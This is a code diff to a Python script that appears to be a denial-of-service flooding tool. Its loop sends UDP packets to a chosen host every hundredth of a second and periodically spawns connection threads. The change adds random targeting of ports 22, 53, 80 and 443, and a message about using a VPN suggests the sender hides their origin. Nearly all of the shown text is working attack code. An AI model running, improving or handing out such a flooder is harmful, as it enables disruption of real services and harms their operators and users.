@@ -39,6 +39,11 @@ def get_random_string(len_from, len_to):
     return result_str
 
 
+def get_random_port():
+    ports = [22, 53, 80, 443]
+    return random.choice(ports)
+
+
 def down_it():
     i = 1
     while True:
@@ -53,20 +58,22 @@ def down_it():
             + "\n" + data
             + "\n\n" + extra_data).encode('utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        p = int(port) if port else get_random_port()
         try:
-            s.sendto(packet, (host, int(port)))
+            s.sendto(packet, (host, p))
         except socket.gaierror:
             print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
         else:
             print('\033[92m Packet was sent \033[0;0m')
         s.close()
 
-        i += 1
-        if i == 50:
-            i = 1
-            thread = threading.Thread(target=connect_host)
-            thread.daemon = True
-            thread.start()
+        if port:
+            i += 1
+            if i == 50:
+                i = 1
+                thread = threading.Thread(target=connect_host)
+                thread.daemon = True
+                thread.start()
         time.sleep(.01)
 
 
@@ -105,7 +112,7 @@ def get_parameters():
     else:
         usage()
     if opts.port is None:
-        port = 80
+        port = None
     else:
         port = opts.port
 
@@ -148,9 +155,11 @@ if __name__ == '__main__':
         print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
         exit()
 
-    connect_host()
+    if port:
+        connect_host()
 
-    print("\033[92m", host, " port: ", str(port), " threads: ", str(thr), "\033[0m")
+    p = str(port) if port else '(22, 53, 80, 443)'
+    print("\033[92m", host, " port: ", p, " threads: ", str(thr), "\033[0m")
     print("\033[94mPlease wait...\033[0m")
     user_agent()
     headers()
